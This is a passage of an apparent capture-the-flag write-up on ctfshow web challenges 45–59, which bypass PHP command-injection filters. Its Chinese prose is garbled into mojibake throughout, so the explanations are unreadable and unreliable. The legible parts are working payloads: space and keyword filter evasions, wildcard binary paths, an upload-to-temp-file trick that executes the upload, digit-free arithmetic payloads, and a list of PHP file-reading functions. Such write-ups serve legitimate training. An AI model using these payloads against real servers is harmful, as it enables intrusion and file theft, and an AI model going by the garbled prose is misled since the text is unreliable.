title="web45"></a>web45</h3><p>Á©∫Ê†ºË¢´ËøáÊª§‰∫Ü</p><blockquote><p>Á©∫Ê†ºÁöÑ‰ª£ÊõøÔºö<br>%09<br>%20<br>$IFS<br>${IFS}<br>$IFS$9<br>&lt;<br>&lt;&gt;</p></blockquote><p>ÊûÑÈÄ†Ôºö<br><code>?c=tac%09fl\ag.php%26</code><br><img src="https://img-blog.csdnimg.cn/ef07d9f8a7de4bb3a1f66651f7927080.png" alt="45"></p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>Êñ∞ËøáÊª§‰∫Ü*$ÂíåÊï∞Â≠ó<br>‰ªçÁÑ∂ÂèØ‰ª•ÊûÑÈÄ†<code>?c=tac%09fl\ag.php%26</code>ÂÖ∂‰∏≠%09Ôºå%26‰∏çÂèóÊï∞Â≠óË¢´ËøáÊª§ÁöÑÂΩ±ÂìçÔºåÂõ†‰∏∫Âú®Âä†ËΩΩÊó∂%09Ôºå%26‰ºöË¢´Ëß£Á†Å‰∏∫Á©∫Ê†ºÂíåÂàÜÂè∑Ôºå‰πüÂ∞±Ê≤°Êúâ‰∫ÜÊï∞Â≠ó„ÄÇ</p><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>‰ªçÁÑ∂ÂèØ‰ª•ÊûÑÈÄ†<code>?c=tac%09fl\ag.php%26</code></p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>‰ªçÁÑ∂ÂèØ‰ª•ÊûÑÈÄ†<code>?c=tac%09fl\ag.php%26</code></p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>‰ªçÁÑ∂ÂèØ‰ª•ÊûÑÈÄ†<code>?c=tac%09fl\ag.php%26</code></p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>ËøáÊª§‰∫Ü\x09Âíå\x26ÔºåÊòØÂçÅÂÖ≠ËøõÂà∂ÔºåÁõ∏ÂΩì‰∫éËøáÊª§‰∫ÜÊää%09Âíå%26urlËß£Á†ÅÂêéÁöÑ\tÂíå&amp;„ÄÇ<br>ÈÇ£‰πàÁî®nlÊûÑÈÄ†<code>?c=nl&lt;&gt;fl\ag.php%0a</code>Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/2711a133cca1468d9c6abf47edf4c596.png" alt="50"></p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>Áî®nlÊûÑÈÄ†<code>?c=nl&lt;&gt;fl\ag.php%0a</code>Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag„ÄÇ</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>ËøáÊª§‰∫Ü&lt;&gt;ÔºåÊîæÂºÄ‰∫Ü$„ÄÇ<br>ÊûÑÈÄ†<br><img src="https://img-blog.csdnimg.cn/f6af93b9f8184e2fac3ac26887309258.png" alt="51"><br>ÊòæÁ§∫ÂÅáÁöÑflag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/d42ab57d32d045f280099f2d39ade197.png" alt="52"></p><p>ÊûÑÈÄ†</p><p><img src="https://img-blog.csdnimg.cn/5239125221384771978e45ffa48aa32a.png" alt="52"></p><p>Ê≤°Êúâflag„ÄÇ<br>Âä†‰∏™ÂèçÂºïÂè∑ÊûÑÈÄ†</p><p><img src="https://img-blog.csdnimg.cn/a0f0ec1b687a4c9bb9c58262da2c2893.png" alt="52"><br>ÂÅáÁöÑflag<br><img src="https://img-blog.csdnimg.cn/84c0438b30b645e3b9aa4f2fe6d86feb.png" alt="52"></p><p>ÊâìÂºÄÊ†πÁõÆÂΩïÊü•ÁúãÔºö</p><p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p><p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p><p>Á≠â‰ª∑‰∫é<code>?c=ls /;</code>ÂÖ∂‰∏≠‚Äú&#x2F;‚ÄùÊòØÊ†πÁõÆÂΩï„ÄÇËØ¥ÊòéflagÂú®Ê†πÁõÆÂΩï‰∏ã<br>ÁßªÂä®flagÂà∞Âêß.txtÊñá‰ª∂‰∏≠ÔºåÊûÑÈÄ†Ôºö<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>Êü•Áúãb.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>ÊäätacËøáÊª§Êéâ‰∫ÜÔºå‰ΩøÁî®tacÊó∂Áî®t\ac‰∏çÂ∞±Ë°å‰∫ÜÂêóÔºü<br>ÊûÑÈÄ†Ôºö<code>ls%0a</code><br><img src="https://img-blog.csdnimg.cn/c3df993696314026bf5e3f09c92bfed2.png" alt="53"><br>ÊûÑÈÄ†Ôºö<code>ta\c$&#123;IFS&#125;fl\ag.php%0a</code>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/83fd360699064877aa18112049e00594.png" alt="53"></p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>Â•ΩÂ•áÊÄ™</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//|.*c.*a.*t.*|ÁöÑÊÑèÊÄùÊòØcat Âíåcat‰πãÈó¥ÊèíÂÖ•Â≠óÁ¨¶ÈÉΩË¢´ËøáÊª§‰∫ÜÔºåÁõ∏ÂΩì‰∫éÂºïÂè∑ÁªïËøáÁî®‰∏ç‰∫Ü‰∫Üc""at‰πü‰ºöË¢´ËøáÊª§</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?c=ls%0a</code>Êü•Áúã‰∏Ä‰∏ãÔºå<br><img src="https://img-blog.csdnimg.cn/bc99561bcda249aeb4dcd6bfb536e88a.png" alt="54"><br><code>/?c=t&#39;&#39;ac$&#123;IFS&#125;fl??.php%0a</code>Êó†ÂõûÊòæ„ÄÇÈÇ£Â∞±Â∞Üflag.phpÁöÑÂêçÂ≠óÊîπ‰∏Ä‰∏ãÔºå<code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;c.txt</code>Êü•Áúãc.txtÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/e0c0b3fb362541a494d84e24c336876c.png" alt="54"></p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// ‰Ω†‰ª¨Âú®ÁÇ´ÊäÄÂêóÔºü</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëøô‰∏ãÂ•Ω‰∫ÜÔºåËøáÊª§‰∫ÜÂ≠óÊØçÔºå‰ΩÜÊòØÊï∞Â≠óÊ≤°ÊúâËøáÊª§ÔºåÊï∞Â≠óÔºü64ÔºüÁî®base64Âä†ÂØÜÂÜÖÂÆπ„ÄÇÂéüÂÜÖÂÆπ‰∏∫<code>/bin/base64 flag.php</code>ËøáÊª§‰∫ÜÂ≠óÊØçÔºüÁî®Ôºü‰ª£ÊõøÔºåÁÑ∂Âêé‰∏∫Ôºö<code>/???/????64 ????.???</code><br><img src="https://img-blog.csdnimg.cn/aede99d5d50a4c958806d913e1a910e4.png" alt="55"><br>Ëß£ÂØÜÂêéÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/39f6b55ee217431cb0f50b6b5fab570f.png" alt="55"><br> Áü•ËØÜÁÇπÔºö<br> ÂèØ‰ª•ÂåπÈÖçÂà∞&#x2F;binÁõÆÂΩï‰∏ãÁöÑÂëΩ‰ª§</p><blockquote><p>cat„ÄÅcp„ÄÅchmod df„ÄÅdmesg„ÄÅgzip„ÄÅkill„ÄÅls„ÄÅmkdir„ÄÅmore„ÄÅmount„ÄÅrm„ÄÅsu„ÄÅtar„ÄÅbase64Á≠â</p></blockquote><p> <strong>ÊñπÊ≥ï‰∫å</strong></p><p>ÂèÇËÄÉÁöÑwp,ÊúâÁî®bzip2ÁöÑÂëΩ‰ª§ÁöÑ„ÄÇËØ∑ÂèÇËÄÉ<a href="https://blog.csdn.net/qq313088385/article/details/114382259">ËøôÈáå</a></p><blockquote><p> ÂëΩ‰ª§ÂêçÁß∞Ôºöbzip2<br> ÂëΩ‰ª§ÂÖ®Áß∞Ôºöa block-sorting file compressor<br> ÊâßË°åÊùÉÈôêÔºöÊâÄÊúâÁî®Êà∑<br> ÊâÄÂú®Ë∑ØÂæÑÔºö&#x2F;usr&#x2F;bin&#x2F;bzip2<br> ÂäüËÉΩÊèèËø∞ÔºöÂéãÁº©Êñá‰ª∂</p></blockquote><p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáËØ•ÂëΩ‰ª§ÂéãÁº©flag.php ÁÑ∂ÂêéËøõË°å‰∏ãËΩΩ<br>payloadÔºö?c&#x3D;&#x2F;???&#x2F;???&#x2F;???2 ????.???<br>‰πüÂ∞±ÊòØ&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php<br>ÁÑ∂ÂêéËÆøÈóÆ&#x2F;flag.php.bz2ËøõË°å‰∏ãËΩΩËé∑Âæóflag.php</p><p><strong>ÊñπÊ≥ï‰∏â</strong></p><p><a href="https://blog.csdn.net/snowlyzz/article/details/125051503">ÂèÇËÄÉ</a></p><p>ÂâçÊèêÊòØ È¢òÁõÆÊ≤°ÊúâËøáÊª§ ? &#x2F; . (ÈóÆÂè∑ÔºåÊñúÊù†,ÁÇπ)ÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™ÊñπÊ≥ïËøõË°å<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p><p>ÁºñÂÜô Êú¨Âú∞Êñá‰ª∂‰∏ä‰º†ÁöÑÁΩëÈ°µÔºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTÊï∞ÊçÆÂåÖPOC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0bb2c3a2-2646-491d-80fa-52c6bee9decc.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--ÈìæÊé•ÊòØÂΩìÂâçÊâìÂºÄÁöÑÈ¢òÁõÆÈìæÊé•--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Êñá‰ª∂ÂêçÔºö<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Êèê‰∫§<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Êàë‰ª¨ÂèØ‰ª•ÂèëÈÄÅ‰∏Ä‰∏™‰∏ä‰º†Êñá‰ª∂ÁöÑPOSTÂåÖÔºåÊ≠§Êó∂PHP‰ºöÂ∞ÜÊàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂‰øùÂ≠òÂú®‰∏¥Êó∂Êñá‰ª∂Â§π‰∏ãÔºåÈªòËÆ§ÁöÑÊñá‰ª∂ÂêçÊòØ&#x2F;tmp&#x2F;phpXXXXXXÔºåÊñá‰ª∂ÂêçÊúÄÂêé6‰∏™Â≠óÁ¨¶ÊòØÈöèÊú∫ÁöÑÂ§ßÂ∞èÂÜôÂ≠óÊØç„ÄÇËá≥‰∫éÂêéÈù¢‰∏∫‰ªÄ‰πàË¶ÅÂä†[@-[],ÊòØ‰∏∫‰∫ÜÂåπÈÖçÂà∞Êñá‰ª∂ÁöÑÊúÄÂêé‰∏Ä‰∏™Â≠óÊØçÁöÑÂ§ßÂÜô</p><p>ÂΩìÁÑ∂ÔºåphpÁîüÊàê‰∏¥Êó∂Êñá‰ª∂ÂêçÊòØÈöèÊú∫ÁöÑÔºåÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶‰∏ç‰∏ÄÂÆöÊòØÂ§ßÂÜôÂ≠óÊØçÔºå‰∏çËøáÂ§öÂ∞ùËØïÂá†Ê¨°‰πüÂ∞±Ë°å‰∫Ü„ÄÇ<br>ÊûÑÈÄ†pocÊâßË°åÂëΩ‰ª§</p><blockquote><p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p></blockquote><p>Ê≥®ÔºöÂêéÈù¢ÁöÑ[@-[]ÊòØlinux‰∏ãÈù¢ÁöÑÂåπÈÖçÁ¨¶ÔºåÊòØËøõË°åÂåπÈÖçÁöÑÂ§ßÂÜôÂ≠óÊØç„ÄÇ<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>ËøôÈáåÁöÑÂ≠óÊØçÂíåÊï∞Â≠óÈÉΩË¢´ËøáÊª§‰∫ÜÔºåÈ¢òÁõÆËØ¥‰º†ÂÖ•‰∏Ä‰∏™36ÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/cbc6e031f9034562a1fac4c51868d50f.png" alt="57">ÈÇ£Â∫îËØ•ÊÄé‰πà‰º†ÂÖ•‰∏Ä‰∏™36Âë¢Ôºü<br>Âõ†‰∏∫ÊòØÂú®shellÁéØÂ¢É‰∏ãÁöÑÔºåÊâÄ‰ª•ÈúÄË¶Å‰ΩøÁî®linux shellÁöÑ‰∏Ä‰∫õÁâπÊÄßÔºö</p><p><code>$(())</code>‰ª£Ë°®ÂÅö‰∏ÄÊ¨°ËøêÁÆóÔºåÂõ†‰∏∫ÈáåÈù¢‰∏∫Á©∫Ôºå‰πüË°®Á§∫ÂÄº‰∏∫0<br><code>$((~$(())))</code> ÂØπ0‰ΩúÂèñÂèçËøêÁÆóÔºåÂÄº‰∏∫-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1Ôºå‰πüÂ∞±ÊòØ(-1)+(-1)‰∏∫-2ÔºåÊâÄ‰ª•ÂÄº‰∏∫-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code>ÂÜçÂØπ-2ÂÅö‰∏ÄÊ¨°ÂèñÂèçÂæóÂà∞1ÔºåÊâÄ‰ª•ÂÄº‰∏∫1<br>Â¶ÇÊûúÂØπÂèñÂèç‰∏ç‰∫ÜËß£ÂèØ‰ª•ÁôæÂ∫¶‰∏Ä‰∏ãÔºåËøôÈáåÁªô‰∏™ÂÆπÊòìËÆ∞ÂæóÂºèÂ≠êÔºåÂ¶ÇÊûúÂØπaÊåâ‰ΩçÂèñÂèçÔºåÂàôÂæóÂà∞ÁöÑÁªìÊûú‰∏∫-(a+1)Ôºå‰πüÂ∞±ÊòØÂØπ0ÂèñÂèçÂæóÂà∞-1<br>ÈÇ£‰πàÊúÄÂêéÂè™ÈúÄË¶Å37‰∏™-1Áõ∏Âä†ÂÜçÂèñÂèçÂç≥ÂèØ„ÄÇ<br>ÂÜô‰∏™ËÑöÊú¨ÁîüÊàêpayloadÔºö</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">data</span> = <span class="token string">"$((~$(("</span><span class="token operator">+</span><span class="token string">"$((~<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>)))"</span><span class="token operator">*</span>37+<span class="token string">"))))"</span>print<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/1dfc1bd03f634f0a8ac2897860397df8.png" alt="57"><br>‰º†ÂèÇÂêéÊü•ÁúãÊ∫êÁ†ÅÔºö<br><img src="https://img-blog.csdnimg.cn/2229ad05e7d44402a9129cac3b7498bf.png" alt="57"></p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>ËøôÊ¨°ÊòØpost‰º†ÂÖ•‰∏Ä‰∏™cÔºå‰∏çÂ¶®Áî®ËöÅÂâëËØïËØïÔºü</p><p><img src="https://img-blog.csdnimg.cn/d4deb1dd5ef34b2e8119e315fcb326aa.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/b95d371722ed4cff845d0949b4ec7129.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/9bdfc6036b5244c089d74c881fcdf78d.png" alt="58"></p><p><strong>ÊñπÊ≥ï‰∫å</strong><br>post‰º†ÂèÇÔºö<br>‰º†ÂÖ•<code>c=passthru(&quot;ls&quot;);``c=system(&quot;ls&quot;);</code>Á≠âÔºåÂèëÁé∞ÊàëËØïÁöÑÁ≥ªÁªüÂëΩ‰ª§ÈÉΩË¢´ËøáÊª§‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/8067867549014691beb5f8863079e2d3.png" alt="58"><br>ËøôÈáåË°•ÂÖÖ‰∏Ä‰∫õËØªÂèñÊñá‰ª∂ÁöÑÂáΩÊï∞ÁöÑÁî®Ê≥ïÔºö</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">highlight_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>show_source<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>php_strip_whitespace<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readfile<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> var_dumpfread<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> Èùûphp‰ª£Á†Åinclude_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> Èùûphp‰ª£Á†Årequire<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> Èùûphp‰ª£Á†Årequire_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> Èùûphp‰ª£Á†Åprint_r<span class="token punctuation">(</span>fread<span class="token punctuation">(</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>fgets<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> ËØªÂèñ‰∏ÄË°åfpassthru<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> ‰ªéÂΩìÂâç‰ΩçÁΩÆ‰∏ÄÁõ¥ËØªÂèñÂà∞ EOFprint_r<span class="token punctuation">(</span>fgetcsv<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>fgetss<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> ‰ªéÊñá‰ª∂ÊåáÈíà‰∏≠ËØªÂèñ‰∏ÄË°åÂπ∂ËøáÊª§Êéâ HTML Ê†áËÆ∞print_r<span class="token punctuation">(</span>fscanf<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>parse_ini_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> Â§±Ë¥•Êó∂ËøîÂõû false <span class="token punctuation">,</span> ÊàêÂäüËøîÂõûÈÖçÁΩÆÊï∞ÁªÑ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊàëÁî®‰∏Ä‰∏ã<code>c=echo file_get_contents(&quot;flag.php&quot;);</code>ÔºåÂæóÂà∞‰∫Üflag„ÄÇ</p><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>Âêå‰∏äÈ¢òÔºå‰ΩÜËøôÈ¢ò<code>file_get_contents</code>Ë¢´ËøáÊª§‰∫ÜÔºåÊàëËØï‰∫Ü‰∏Ä‰∏ã<code>c=show_source(&quot;flag.php&quot;);</code>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/4f4ed1c363c54412be30562549fda20b.png" 